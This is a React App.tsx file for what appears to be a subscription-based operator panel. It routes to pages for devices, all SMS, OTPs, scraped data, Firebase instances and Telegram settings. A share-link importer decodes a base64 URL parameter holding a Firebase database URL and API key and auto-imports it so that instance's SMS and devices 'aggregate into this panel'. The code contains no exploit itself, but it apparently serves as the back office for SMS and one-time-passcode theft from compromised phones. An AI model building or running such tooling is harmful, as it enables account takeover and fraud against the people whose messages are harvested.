import { Route, Switch, Router as WouterRouter, useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Component, useEffect, type ReactNode } from "react";

// Pages
import { Login } from "@/pages/login";
import { Dashboard } from "@/pages/dashboard";
import { DeviceDetail } from "@/pages/device-detail";
import { Subscriptions } from "@/pages/subscriptions";
import { Profile } from "@/pages/profile";
import { AllSms } from "@/pages/all-sms";
import { ScrapedData } from "@/pages/scraped";
import { TelegramSettings } from "@/pages/telegram-settings";
import { UserSearch } from "@/pages/user-search";
import { OtpPanel } from "@/pages/otps";
import { Firebases } from "@/pages/firebases";
import NotFound from "@/pages/not-found";

// Providers
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { AuthProvider } from "@/lib/auth";
import { ThemeProvider } from "next-themes";

const queryClient = new QueryClient({
  defaultOptions: {
    queries: { retry: 1, staleTime: 30_000, refetchOnWindowFocus: false },
  },
});

// Error Boundary — shows the actual error instead of a white screen
class ErrorBoundary extends Component<
  { children: ReactNode },
  { error: Error | null }
> {
  state = { error: null as Error | null };

  static getDerivedStateFromError(error: Error) {
    return { error };
  }

  render() {
    if (this.state.error) {
      const e = this.state.error;
      return (
        <div
          style={{
            padding: 24,
            fontFamily: "monospace",
            whiteSpace: "pre-wrap",
          }}
        >
          <h2>⚠️ Something went wrong</h2>
          <p>
            <strong>Error name:</strong> {e.name || "unknown"}
          </p>
          <p>
            <strong>Error message:</strong>{" "}
            <span style={{ color: "red" }}>
              {e.message || "(empty message)"}
            </span>
          </p>
          <hr />
          <p style={{ fontSize: 12 }}>
            <strong>Stack trace:</strong>
          </p>
          <pre
            style={{
              fontSize: 12,
              background: "#f5f5f5",
              padding: 12,
              borderRadius: 8,
              overflow: "auto",
            }}
          >
            {import.meta.env.DEV
              ? e.stack || String(e)
              : "Stack hidden in production. Check logs."}
          </pre>
        </div>
      );
    }
    return this.props.children;
  }
}

// Auth Guard — any logged-in user
function ProtectedRoute({ component: Component, ...rest }: any) {
  const { isAuthenticated } = useAuth();
  const [, setLocation] = useLocation();

  useEffect(() => {
    if (isAuthenticated === false) setLocation("/");
  }, [isAuthenticated, setLocation]);

  if (isAuthenticated === null) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center font-mono text-muted-foreground">
        Loading...
      </div>
    );
  }

  return isAuthenticated ? <Component {...rest} /> : null;
}

// Admin Guard — only admin
function AdminRoute({ component: Component, ...rest }: any) {
  const { isAuthenticated, isAdmin } = useAuth();
  const [, setLocation] = useLocation();

  useEffect(() => {
    if (isAuthenticated === false) setLocation("/");
    else if (isAuthenticated === true && !isAdmin) setLocation("/dashboard");
  }, [isAuthenticated, isAdmin, setLocation]);

  if (isAuthenticated === null) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center font-mono text-muted-foreground">
        Loading...
      </div>
    );
  }

  return isAuthenticated && isAdmin ? <Component {...rest} /> : null;
}

function Router() {
  return (
    <Switch>
      <Route path="/" component={Login} />
      <Route path="/dashboard">
        {() => <ProtectedRoute component={Dashboard} />}
      </Route>
      <Route path="/device/:id">
        {() => <ProtectedRoute component={DeviceDetail} />}
      </Route>
      <Route path="/subscriptions">
        {() => <AdminRoute component={Subscriptions} />}
      </Route>
      <Route path="/profile">
        {() => <ProtectedRoute component={Profile} />}
      </Route>
      <Route path="/all-sms">
        {() => <ProtectedRoute component={AllSms} />}
      </Route>
      <Route path="/firebases">
        {() => <ProtectedRoute component={Firebases} />}
      </Route>
      <Route path="/otps">
        {() => <ProtectedRoute component={OtpPanel} />}
      </Route>
      <Route path="/data">
        {() => <ProtectedRoute component={ScrapedData} />}
      </Route>
      <Route path="/telegram">
        {() => <ProtectedRoute component={TelegramSettings} />}
      </Route>
      <Route path="/user-search">
        {() => <ProtectedRoute component={UserSearch} />}
      </Route>
      <Route component={NotFound} />
    </Switch>
  );
}

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

// Mythos-style share-link import: ?s=<base64("url||apiKey")> auto-imports
// the Firebase instance so its SMS/devices aggregate into this panel.
function ShareLinkImporter() {
  const { isAuthenticated, isAdmin } = useAuth();
  const [location] = useLocation();

  useEffect(() => {
    if (!isAuthenticated || !isAdmin) return;
    const m = location.match(/[?&]s=([^&]+)/);
    if (!m) return;
    let decoded = "";
    try {
      decoded = decodeURIComponent(m[1]);
      decoded = atob(decoded);
    } catch {
      return;
    }
    const [url, key] = decoded.split("||").map((x) => x.trim());
    if (!url || !/^https:\/\/.+\.firebaseio\.com$/.test(url)) return;
    const doneKey = "harryaxe-imported-" + m[1];
    try {
      if (sessionStorage.getItem(doneKey)) return;
    } catch {
      /* ignore */
    }

    (async () => {
      try {
        const proj = url.match(
          /\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/
        );
        const res = await fetch(`${API_BASE}/api/firebases`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            name: proj?.[1] || "shared-panel",
            databaseURL: url,
            apiKey: key || "",
          }),
        });
        const json = await res.json();
        try {
          sessionStorage.setItem(doneKey, "1");
        } catch {
          /* ignore */
        }
        // strip the ?s= from the URL so it doesn't re-import
        window.history.replaceState({}, "", window.location.pathname);
        if (json.success) {
          alert("✅ Imported shared panel: " + (json.firebase?.name || url));
        } else {
          alert("⚠️ Import failed: " + (json.error || "unknown"));
        }
      } catch (err: any) {
        alert("⚠️ Import failed: " + (err?.message || "network error"));
      }
    })();
  }, [isAuthenticated, isAdmin, location]);

  return null;
}

function App() {
  return (
    <ErrorBoundary>
      <QueryClientProvider client={queryClient}>
        <AuthProvider>
          <ThemeProvider attribute="class" defaultTheme="dark" enableSystem>
            <TooltipProvider>
              <WouterRouter base="">
                <ShareLinkImporter />
                <Router />
              </WouterRouter>
              <Toaster />
            </TooltipProvider>
          </ThemeProvider>
        </AuthProvider>
      </QueryClientProvider>
    </ErrorBoundary>
  );
}

export default App;
